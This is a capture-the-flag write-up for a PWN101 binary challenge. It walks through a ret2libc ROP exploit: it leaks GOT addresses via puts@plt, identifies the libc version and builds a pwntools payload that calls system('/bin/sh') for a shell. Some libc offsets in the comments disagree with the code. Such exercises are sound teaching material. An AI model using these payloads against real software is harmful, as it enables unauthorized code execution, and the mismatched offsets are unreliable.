## Challenge Overview

- The challenge involves exploiting a buffer overflow vulnerability using ROP technique
- Goal: Executing `call_system` with parameter `/bin/sh`

## Initial Analysis

- Use `checksec` tool to know the type of this binary:

![checksec file](/images/PWN101-pwn09/checksec-file.png)

-> We saw this binary has a fixed base address (NO PIE) and is 64-bit

- If I put a long input to this binary, it will crash:

![long input](/images/PWN101-pwn09/long-input.png)

-> It means there is a vulnerability

- We need to know how GOT (Global Offset Table) and PLT (Procedure Linkage Table) work together:

  1. **GOT**: Holds actual memory addresses (pointers). When a function from an external library is loaded into memory, its address is written here. Because of ASLR (Address Space Layout Randomization), external library locations change every execution.

  2. **PLT**: Contains small stubs of code for each external function that the binary calls. The code stub inside the PLT consists of a jump instruction pointing to the corresponding slot in the GOT.

## Planning to Access Shell

- One way to know the address of `system` or the string `/bin/sh` is to know what library is used.
- Because in the same library, GOT addresses of any function are related to each other.
- So if we know what library is used and the address of any function, we can calculate other functions' addresses (`system`) or string addresses (like `/bin/sh`).

## Strategy to Execute Expected Function

- First, we need to find the actual address of `puts()` in the binary; because of `NO PIE`, this address is fixed.

- Using `puts` is similar to `printf()`, we will use it to leak addresses.

- I can get this address as follows: `plt_puts_address = p64(binary.plt.puts)`

- To find what library is used, I can leak some GOT addresses of functions and identify their library. If we have their addresses, we can use the [Libc Finding Tool](https://libc.blukat.me/) to achieve our goal.

- To find these addresses, we use ROP technique to leak them with `puts@plt`:

  - I will use `ROPgadget Tool` to find `pop rdi; ret`:

```
ROPgadget --binary ./pwn109-1644300507645.pwn109 > gadgets.txt
```

![pop rdi ret address](/images/PWN101-pwn09/pop-rdi-ret-address.png)

  - In pwntools, we can find the location of a function pointer in the GOT, then use `puts@plt` to print the actual address stored at that location. We combine them with ROP to make the payload:

```python
plt_puts_address = p64(binary.plt.puts)
got_puts_address = p64(binary.got.puts)
got_gets_address = p64(binary.got.gets)
got_setvbuf_address = p64(binary.got.setvbuf)

payload = b'A' * 0x20 + b'B' * 0x8

payload += pop_rdi_ret + got_puts_address + plt_puts_address
payload += pop_rdi_ret + got_gets_address + plt_puts_address
payload += pop_rdi_ret + got_setvbuf_address + plt_puts_address
```

- We execute the binary with `payload` as input. The result is:

![result first leak got](/images/PWN101-pwn09/result-first-leak-got.png)

- We copy the last 4 digits of each address and paste them into [Libc Finding Tool](https://libc.blukat.me/) (corresponding with their function). We get:

![push address find libc matching](/images/PWN101-pwn09/push-address-find-libc-matching.png)

- So we see some libc versions match our leaked addresses. Choose one of them, pick a function as the base, and check the offset of other functions or strings in this libc:

![peak base address](/images/PWN101-pwn09/peak-base-address.png)

- Now, we know the particular addresses of `system` and `str_bin_sh` in the libc that the binary uses:

```python
# when gets_address is the base address
# system: -0x316e0
# str_bin_sh: 0x130c4d

system_address = p64(leaked_puts_address - 0x32190)
str_bin_sh = p64(leaked_puts_address + 0x13019d)
```

- We do ROP technique again. First, we need to run `main` once more to pass new input (because of `NO PIE`, we can add the address of `main` to the previous payload. When the binary is executed, after leaking, `rip` will return to `main`):

```python
payload_2 = b'A' * 0x20 + b'B' * 0x8
payload_2 += ret_address + pop_rdi_ret + str_bin_sh + system_address

p.recvuntil(b"ahead")
p.recvline()
p.sendline(payload_2)
p.interactive()
```
